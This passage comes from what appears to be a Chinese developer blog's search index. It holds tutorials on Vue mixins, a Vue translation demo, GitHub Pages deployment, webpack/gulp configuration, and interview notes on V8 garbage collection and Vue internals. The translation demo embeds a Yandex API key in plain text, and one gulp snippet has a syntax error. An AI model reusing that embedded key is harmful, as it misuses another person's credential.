class="attr">id</span>=<span class="string">"move"</span>&gt;</span>BUTTON<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">id</span>=<span class="string">"close"</span>&gt;</span>X<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/drag3.gif" alt="My Pic"></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>vue中mixins的使用</title>
    <url>/2019/06/25/vue%E4%B8%ADmixins%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;对于mixins这个属性，自己经常在别人写的一些组件中看到，但是也不太清楚其具体的用法，所以今天抽空网上查了查学习一下它的用法。<br><a id="more"></a></p>
<ul>
<li><p>mixins的基本概念</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">混入 (mixins)： 是一种分发 Vue 组件中可复用功能的非常灵活的方式。混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被混入该组件本身的选项。</span><br></pre></td></tr></table></figure>
</li>
<li><p>那到底是干嘛的？我们该怎么使用它呢？先写的demo</p>
</li>
<li><p>我们先定义一个mixins对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> helloMixin = &#123;</span><br><span class="line">  name: <span class="string">'HelloWorld'</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    msg: <span class="built_in">String</span></span><br><span class="line">  &#125;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    sayHello () &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'hello'</span> + <span class="keyword">this</span>.msg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后再一个组件中引入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"hello"</span>&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button @click="sayHello"&gt;click&lt;/</span>button&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; helloMixin &#125; <span class="keyword">from</span> <span class="string">'./mixins/helloMixin'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'HelloWorld'</span>,</span><br><span class="line">  mixins: [helloMixin]</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol>
<li>然后我们调用这个组件时，就可以调用mixins中的属性和方法了</li>
<li>还有个比较重要的就是如果mixins中的方法和组件中的方法冲突了那么最后会调用组件中的方法，方法和参数在各组件中不共享，值为函数的选项，如created,mounted等，就会被合并调用，混合对象里的钩子函数在组件里的钩子函数之前调用</li>
<li>主要作用就是提取一些组件中的公共部分来复用，可以定义共用的变量，在每个组件中使用，引入组件中之后，各个变量是相互独立的，值的修改在组件中不会相互影响。</li>
</ol>
<ul>
<li><p>还有一个特殊情况，当mixins中含有异步方法时，而我们又需要在组件中使用异步请求函数的返回值时，我们会取不到此返回值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  sayHello () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span> + <span class="keyword">this</span>.msg)</span><br><span class="line">  &#125;,</span><br><span class="line">  getData () &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> data = <span class="string">'I am here'</span></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        resolve(data)</span><br><span class="line">      &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> v</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">mounted () &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.getData()) <span class="comment">//为undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>解决方案：不要返回结果而是直接返回异步函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  sayHello () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span> + <span class="keyword">this</span>.msg)</span><br><span class="line">  &#125;,</span><br><span class="line">  getData () &#123;</span><br><span class="line">    <span class="keyword">var</span> fun = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">'I am here'</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(data)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> fun</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">mounted () &#123;</span><br><span class="line">  <span class="keyword">this</span>.getData().then(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(v) <span class="comment">//I am here</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>-Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>vue在线翻译Demo</title>
    <url>/2018/03/07/vue%E5%9C%A8%E7%BA%BF%E7%BF%BB%E8%AF%91Demo/</url>
    <content><![CDATA[<p>1.全局安装vue-cli（已安装则可跳过此步骤）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 全局安装 vue-cli</span><br><span class="line">$ npm install --global vue-cli</span><br></pre></td></tr></table></figure></p>
<p>2.创建基于webpack的新项目<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue init webpack 项目名</span><br></pre></td></tr></table></figure></p>
<p>安装过程中会有一些常规问题，项目名称、作者、是否需要安装其他模块</p>
<p>3.进入项目根目录，安装依赖 开启项目<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#安装依赖</span><br><span class="line">npm install</span><br><span class="line">#运行项目</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p> <img src="/images/vue.png" alt="My Pic"><br>4.项目搭建 分为3个组件</p>
<p>&nbsp;&nbsp;&nbsp;4.1根组件（即App.vue）<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">    &lt;h1&gt;在线翻译&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h5 class="text-muted"&gt;简单 /</span> 易用 / 便捷&lt;<span class="regexp">/h5&gt;</span></span><br><span class="line"><span class="regexp">    &lt;Translate v-on:formSub="translateText"&gt;&lt;/</span>Translate&gt;</span><br><span class="line">    &lt;Output v-bind:translatedText=<span class="string">"translatedText"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Output</span>&gt;</span></span></span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> Translate <span class="keyword">from</span> <span class="string">'./components/Translate'</span></span><br><span class="line"><span class="keyword">import</span> Output <span class="keyword">from</span> <span class="string">'./components/Output'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'App'</span>,</span><br><span class="line">  data:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span>&#123;</span><br><span class="line">        translatedText:<span class="string">""</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Translate,Output</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    translateText:<span class="function"><span class="keyword">function</span>(<span class="params">text,language</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.$http.get(<span class="string">'https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20180305T143933Z.d87ffb49bbd9cb80.6a9c4cad5cd0e8251249146aca113cdd0b2ce7cb&amp;lang='</span>+language+<span class="string">'&amp;text='</span>+text)</span><br><span class="line">      .then(<span class="function">(<span class="params">response</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//console.log(response.body.text[0]);</span></span><br><span class="line">        <span class="keyword">this</span>.translatedText=<span class="string">'Answer:'</span>+response.body.text[<span class="number">0</span>];</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>其中引入了其他两个组件，并且使用了Vue-Resource模块向yandex网站请求翻译的api，注意url中的参数key是使用api的密钥，lang是要翻译为什么语言，text是翻译的文本，将结果渲染到组件中。</p>
<p>&nbsp;&nbsp;&nbsp;4.2Translate.vue<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"translate row"</span>&gt;</span><br><span class="line">    &lt;form v-on:submit=<span class="string">"formSubmit"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"well form-inline col-md-6 col-md-offset-3"</span> id=<span class="string">"trans"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"text"</span> placeholder=<span class="string">"输入要翻译的内容"</span> v-model=<span class="string">"textToTranslate"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> style=<span class="string">"margin-left:120px;"</span>&gt;</span><br><span class="line">      &lt;select v-model=<span class="string">"language"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span>&gt;</span><br><span class="line">        &lt;option value=<span class="string">"en"</span>&gt;English&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">        &lt;option value="ru"&gt;Russian&lt;/</span>option&gt;</span><br><span class="line">        &lt;option value=<span class="string">"ko"</span>&gt;Korean&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">        &lt;option value="fr"&gt;French&lt;/</span>option&gt;</span><br><span class="line">      &lt;<span class="regexp">/select&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="submit" value="翻译" class="btn btn-primary"/</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">export default &#123;</span></span><br><span class="line"><span class="regexp">  name: 'translate',</span></span><br><span class="line"><span class="regexp">  data () &#123;</span></span><br><span class="line"><span class="regexp">    return &#123;</span></span><br><span class="line"><span class="regexp">      textToTranslate:"",</span></span><br><span class="line"><span class="regexp">      language:""</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  methods:&#123;</span></span><br><span class="line"><span class="regexp">    formSubmit:function(e)&#123;</span></span><br><span class="line"><span class="regexp">      this.$emit('formSub',this.textToTranslate,this.language);</span></span><br><span class="line"><span class="regexp">      e.preventDefault();</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  created:function()&#123;</span></span><br><span class="line"><span class="regexp">    this.language="en";</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个组件中定义了可以翻译语言的种类，注意option中的value值要与api中的语言代码一致，默认初始选择English。<br>&nbsp;&nbsp;&nbsp;4.3Output.vue<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"Output"</span>&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;translatedText&#125;&#125;&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">export default &#123;</span></span><br><span class="line"><span class="regexp">  name: 'Output',</span></span><br><span class="line"><span class="regexp">  props:[</span></span><br><span class="line"><span class="regexp">    'translatedText'</span></span><br><span class="line"><span class="regexp">  ]</span></span><br><span class="line"><span class="regexp">  </span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></p>
<p>该组件就将从App.vue中获取的值渲染到页面上。<br><img src="/images/t1.png" alt="My Pic"><br><img src="/images/t2.png" alt="My Pic"></p>
]]></content>
      <categories>
        <category>vue.js</category>
      </categories>
      <tags>
        <tag>vue </tag>
      </tags>
  </entry>
  <entry>
    <title>vue项目github预览</title>
    <url>/2018/12/12/vue%E9%A1%B9%E7%9B%AEgithub%E9%A2%84%E8%A7%88/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;今天在掘金上看到了一片文章通过vue+echars写了一个在线简历的文章感觉效果还是不错的，自己也很快的copy了一个自己的简历，这时候就出现了一个问题。我要如何让别人也能看到我这个简历呢？由于我自己还没有服务器 所以就只能想到利用github了。之前通过github搭过自己的一个blog 于是就按照之前的步骤 把代码传到了GitHub上  在仓库的setting中GitHub Pages选项中把source改成自己的分支 这是后就会有一个链接，但是这次点开之后却啥也没有 👿 emmm<br><a id="more"></a><br> <img src="/images/git1.jpg" alt="My Pic"><br>  <img src="/images/git2.jpg" alt="My Pic"><br>然后自己在网上查了一下  原来没把自己的dist目录传上去  于是在项目的.gitignore中删除了/dist/ 这时再重新打包上传 发现项目中有了dist目录 于是再次打开网址并且在后面拼上dist 然而显示的还是一片空白 于是接着打开控制台 发现好多js的请求404了 于是又看了下引用的路径并且网上查了一下 发现时路径前面多了一个/ 于是又按照网上的解决方法在项目的config文件夹中 找到index.js 将里面build部分的assetsPublicPath的/去掉 再重新build一次<br>现在终于可以访问了<br> <img src="/images/git3.jpg" alt="My Pic"><br>  <img src="/images/git4.jpg" alt="My Pic"><br>   <img src="/images/git5.jpg" alt="My Pic"><br>    <img src="/images/git6.jpg" alt="My Pic"><br>以后还是考虑自己买个服务器吧 速度有时候太感人了 emmm</p>
]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>vue </tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>一个敲代码的地方</title>
    <url>/2018/10/13/%E4%B8%80%E4%B8%AA%E6%95%B2%E4%BB%A3%E7%A0%81%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近在掘金上看到了别人分享的文章中推荐了一个在线做编程题的地方，自己试了一下感觉还不错的说，首先自己注册了，可以关联github。进去之后选择对应的编程语言，选择自己的水平，就可以开始训练了，并且它还是等级制的，通过自己做题提升等级。题的难度也会慢慢增加。<br><a id="more"></a><br><img src="/images/code1.png" alt="My Pic"><br><img src="/images/code2.png" alt="My Pic"><br><img src="/images/code3.png" alt="My Pic"></p>
]]></content>
      <categories>
        <category>生活分享</category>
      </categories>
      <tags>
        <tag>生活分享</tag>
      </tags>
  </entry>
  <entry>
    <title>一些打包工具</title>
    <url>/2018/04/28/%E4%B8%80%E4%BA%9B%E6%89%93%E5%8C%85%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;在没接触打包工具之前，一直不知道打包工具是干嘛的。初步接触之后，感觉好复杂，又是命令行，又是各种配置文件。但是在自己真正的使用之后，才发现打包工具真的可以减少我们很多的工作量。前端的打包工具也很多，我真正使用过的也只有webpack和gulp下面就简单介绍一下它们的使用。</p>
<h1 id="1-webpack"><a href="#1-webpack" class="headerlink" title="1.webpack"></a>1.webpack</h1><p>&nbsp;&nbsp;&nbsp;webpack是一个模块打包机，它可以分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。可以把项目的各种js，css文件打包合并成一个文件。<br><span style="font-size: 16px;padding-left:10px;font-weight: bold;">1.1安装</span><br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//首先全局安装</span><br><span class="line">npm install -g webpack</span><br><span class="line">//再安装到你的项目目录</span><br><span class="line">npm install --save-dev webpack</span><br><span class="line">//创建项目依赖文件</span><br><span class="line">npm init</span><br></pre></td></tr></table></figure></p>
<p>项目结构和配置文件就如下图所示<br><img src="/images/w1.png" alt="My Pic"><br><img src="/images/w2.png" alt="My Pic"></p>
<p><span style="font-size: 16px;padding-left:10px;font-weight: bold;">1.2实例</span><br>运用到一个实例项目中，此时项目结构如图所示:<br><img src="/images/w3.png" alt="My Pic"><br>在根目录下创建配置文件webpack.config.js<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  entry : &apos;./js/public.js&apos;,//入口文件</span><br><span class="line">    output : &#123;//输出文件</span><br><span class="line">        filename : &apos;pub.js&apos;,//输出文件名</span><br><span class="line">        path : __dirname + &apos;/out&apos;//输出文件路径</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这时我们就可以在入口的js中引入其他的js或者css文件，不过要完成一些转换还需要一些转化规则和插件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*babel Babel其实是一个编译JavaScript的平台，它可以编译代码帮你达到以下目的：让你能使用最新的JavaScript代码（ES6，ES7...），而不用管新标准是否被当前使用的浏览器完全支持；让你能使用基于JavaScript进行了拓展的语言，比如React的JSX；*/</span><br><span class="line">npm install --save-dev babel-core babel-loader babel-preset-env babel-preset-react</span><br><span class="line">//babel-preset-env 转化es6  babel-preset-react转化JSX</span><br><span class="line"></span><br><span class="line">css-loader 和 style-loader，二者处理的任务不同，css-loader使你能够使用类似@import 和 url(...)的方法实现 require()的功能,style-loader将所有的计算后的样式加入页面中，二者组合在一起使你能够把样式表嵌入webpack打包后的JS文件中。</span><br><span class="line">npm install --save-dev style-loader css-loader</span><br></pre></td></tr></table></figure></p>
<p>安装完成之后，还要在配置文件webpack.config.js中添加配置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module : &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;test: /.js$/, use: [&apos;babel-loader&apos;]&#125;,</span><br><span class="line">        &#123;test: /.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;]&#125;,/*解析css, 并把css添加到html的style标签里*/</span><br><span class="line">        //&#123;test: /.css$/, use: ExtractTextPlugin.extract(&#123;fallback: &apos;style-loader&apos;,use: &apos;css-loader&apos;&#125;)&#125;,/*解析css, 并把css变成文件通过link标签引入*/</span><br><span class="line">        &#123;test: /.(jpg|png|gif|svg)$/, use: [&apos;url-loader?limit=8192&amp;name=./[name].[ext]&apos;]&#125;,/*解析图片*/</span><br><span class="line">        &#123;test: /.less$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;, &apos;less-loader&apos;]&#125;/*解析less, 把less解析成浏览器可以识别的css语言*/</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<p>安装配置完成之后，我们就可以在命令行中输入webpack打包(也可以在package.json中的scripts对象中添加命令，自定义一些允许的单词来启动)<br>打包之后的效果<br><img src="/images/w4.png" alt="My Pic"><br><img src="/images/w5.png" alt="My Pic"><br>这样就只需在页面中引入这一个文件就可以了 出此之外webpack中还可以引用很多的外部插件，在配置文件中引入就行了</p>
<h1 id="2-gulp"><a href="#2-gulp" class="headerlink" title="2.gulp"></a>2.gulp</h1><p>&nbsp;&nbsp;&nbsp;gulp是前端开发过程中对代码进行自动化构建的利器。它不仅能对资源进行优化，而且在开发过程中能够通过配置自动完成很多重复的任务，让我们可以专注于代码，提高工作效率。<br><span style="font-size: 16px;padding-left:10px;font-weight: bold;">2.1安装</span><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//全局安装 gulp</span><br><span class="line">npm install --global gulp</span><br><span class="line">// 作为项目的开发依赖</span><br><span class="line">npm install --save-dev gulp</span><br></pre></td></tr></table></figure></p>
<p><span style="font-size: 16px;padding-left:10px;font-weight: bold;">2.2使用</span><br>在根目录中创建gulpfile.js文件，在该文件中写我们要进行的操作。其中很多操作都需要引入外部的包，使用前我们要先用npm下载。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var gulp = require(&apos;gulp&apos;);</span><br><span class="line">var cssnano = require(&apos;gulp-cssnano&apos;);</span><br><span class="line">const autoprefixer = require(&apos;gulp-autoprefixer&apos;);</span><br><span class="line">var uglify = require(&apos;gulp-uglify&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gulp.task(&apos;default&apos;,[&apos;hello&apos;], function() &#123;</span><br><span class="line">    console.log(&apos;dayingyixia&apos;)</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(&apos;hello&apos;, function() &#123;</span><br><span class="line">    console.log(&apos;wolrd&apos;)</span><br><span class="line">&#125;);</span><br><span class="line">//css压缩 gulp-cssnano</span><br><span class="line">gulp.task(&apos;cssnano&apos;, function() &#123;</span><br><span class="line">    return gulp.src(&apos;./src/style/main.css&apos;)//找到要压缩的文件</span><br><span class="line">        .pipe(cssnano())//pipe是管道  main.css通过管道传输到下面</span><br><span class="line">        .pipe(gulp.dest(&apos;./out&apos;));//输出文件</span><br><span class="line">&#125;);</span><br><span class="line">//css 补全前缀gulp-autoprefixer</span><br><span class="line">gulp.task(&apos;autoprefixer&apos;, () =&gt;</span><br><span class="line">    gulp.src(&apos;src/style/main.css&apos;)</span><br><span class="line">        .pipe(autoprefixer(&#123;</span><br><span class="line">            browsers: [&apos;last 2 versions&apos;],//向前几个版本</span><br><span class="line">            cascade: false</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(&apos;dist&apos;))</span><br><span class="line">);</span><br><span class="line">//js 代码混淆  gulp-uglifyjs</span><br><span class="line">gulp.task(&apos;compress&apos;, function (cb) &#123;</span><br><span class="line">            gulp.src(&apos;src/js/*.js&apos;)</span><br><span class="line">            .pipe(uglify())</span><br><span class="line">            .pipe(gulp.dest(&apos;dist&apos;))</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>运行时在命令行输gulp 定义的名称  就能生成处理之后的文件，也可以管道嵌套一次性完成多个任务</p>
]]></content>
      <categories>
        <category>前端工具</category>
      </categories>
      <tags>
        <tag>打包</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>一些面试的总结</title>
    <url>/2020/06/28/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近又参加了许多的面试，这里简单总结一下面试中遇到的自己还不是太清楚的问题。主要是一些自己之前没了解过的知识点。<br><a id="more"></a></p>
<h3 id="V8垃圾回收"><a href="#V8垃圾回收" class="headerlink" title="V8垃圾回收"></a>V8垃圾回收</h3><blockquote>
<p>v8是Google推出的JS引擎，他不仅提升了Chrome的性能，也为node提供了很好的支持。其垃圾回收机制主要采用的是内存分代。</p>
</blockquote>
<h4 id="V8的内存分代"><a href="#V8的内存分代" class="headerlink" title="V8的内存分代"></a>V8的内存分代</h4><blockquote>
<p>在v8中将内存分为了新生代和老生代，他们的主要特点如下：</p>
</blockquote>
<ul>
<li>老生代：对象存活时间较长。经历过一次或多次垃圾回收的对象。</li>
<li>新生代：对象的存活时间较短。新生对象或只经过一次垃圾回收的对象。</li>
</ul>
<blockquote>
<p>V8堆的空间等于新生代空间加上老生代空间。我们可以通过 –max-old-space-size命令设置老生代空间的最大值，–max-new-space-size 命令设置新生代空间的最大值。老生代与新生代的空间大小在程序初始化时设置，一旦生效则不能动态改变。</p>
</blockquote>
<h4 id="回收算法"><a href="#回收算法" class="headerlink" title="回收算法"></a>回收算法</h4><ul>
<li>新生代算法： 主要采用Scavenge算法</li>
</ul>
<blockquote>
<p>先在新生代区，将堆内存对半分，一半处于使用(即From区)，另一半处于闲置(即To区)，平时在From区进行操作。到了要回收的时候，检测From区的对象，存活的对象复制到To   区，然后From区被释放了，之后对To区和From区调换名字，继续重复之前操作</p>
</blockquote>
<ul>
<li>对象晋升： 新生代 -&gt; 老生代</li>
</ul>
<blockquote>
<p>对象是否经历过Scavenge回收。对象从 From 空间复制 To 空间时，会检查对象的内存地址来判断对象是否已经经过一次Scavenge回收。若经历过，则将对象从 From 空间复制到老生代中；若没有经历，则复制到 To 空间。</p>
<p>To 空间的内存使用占比是否超过限制。当对象从From 空间复制到 To 空间时，若 To 空间使用超过 25%，则对象直接晋升到老生代中。设置为25%的比例的原因是，当完成 Scavenge 回收后，To 空间将翻转成From 空间，继续进行对象内存的分配。若占比过大，将影响后续内存分配。</p>
</blockquote>
<ul>
<li>老生代算法： 标记清除 搭配 标记整理算法</li>
</ul>
<blockquote>
<p>标记清除算法：先将存活的对象进行标记，清除时只清除没有标记的（老生代中都是生命周期长的对象，刚好死亡的对象少），不过此时会出现内存不连续的情况。但是，如果此时需要放一个大对象，则放不下，从而导致再次引起回收。然而这次回收是不必要的。</p>
<p>标记整理算法：先将死亡的对象进行标记，然后将存活得对象往一段移动，移动完成后，清理掉边界外的内存。</p>
</blockquote>
<h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><blockquote>
<p>我们应该都知道v-model是用来在一些表单控件（input、select、textarea）上创建双向数据绑定。其本质上也是语法糖，不同的控件对应着不同的属性和事件。但是在自定义组件上又起着怎样的作用呢？</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;base-checkbox v-model=&quot;value&quot;&gt;&lt;/base-checkbox&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value attribute 用于不同的目的。这样的话主要是使用model选项来控制</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'base-checkbox'</span>, &#123;</span><br><span class="line">  model: &#123;</span><br><span class="line">    prop: <span class="string">'checked'</span>,</span><br><span class="line">    event: <span class="string">'change'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    checked: <span class="built_in">Boolean</span></span><br><span class="line">  &#125;,</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;input</span></span><br><span class="line"><span class="string">      type="checkbox"</span></span><br><span class="line"><span class="string">      v-bind:checked="checked"</span></span><br><span class="line"><span class="string">      v-on:change="$emit('change', $event.target.checked)"</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;base-checkbox v-model=<span class="string">"message"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">base-checkbox</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里的 message 的值将会传入这个名为 checked 的 prop。同时当 <base-checkbox> 触发一个 change 事件并附带一个新的值的时候，这个 message 的 property 将会被更新</base-checkbox></p>
</blockquote>
<h3 id="Vue-DIFF-算法"><a href="#Vue-DIFF-算法" class="headerlink" title="Vue DIFF 算法"></a>Vue DIFF 算法</h3><blockquote>
<p>简单的来说，vue的diff算法会有以下的过程：</p>
<ul>
<li>同级比较，再比较子节点</li>
<li>先判断一方有子节点一方没有子节点的情况（如果新的children没有子节点，将旧的子节点移除）</li>
<li>比较都有子节点的情况（核心diff）</li>
<li>递归比较子节点</li>
</ul>
